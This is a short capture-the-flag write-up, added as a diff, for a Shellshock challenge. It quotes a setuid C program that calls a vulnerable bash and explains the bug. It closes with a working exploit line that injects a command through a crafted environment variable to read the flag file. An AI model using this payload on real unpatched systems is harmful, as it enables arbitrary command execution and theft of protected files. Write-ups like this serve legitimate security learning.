@@ -1,0 +1,18 @@
+Prompt: Mommy, there was shocking news about bash. 
+I bet you already know, but let's just make sure :)
+
+shellshock.c:
+#include <stdio.h>
+int main(){
+        setresuid(getegid(), getegid(), getegid());
+        setresgid(getegid(), getegid(), getegid());
+        system("/home/shellshock/bash -c 'echo shock_me'");
+        return 0;
+}
+
+Shellshock is a well known bug that allows for arbitrary command
+execution in an unpatched bash. The technique is to define a 
+specially crafted environment variable that is executed like a 
+function.
+
+env VAR='() { :;}; /bin/cat flag' ./shellshock
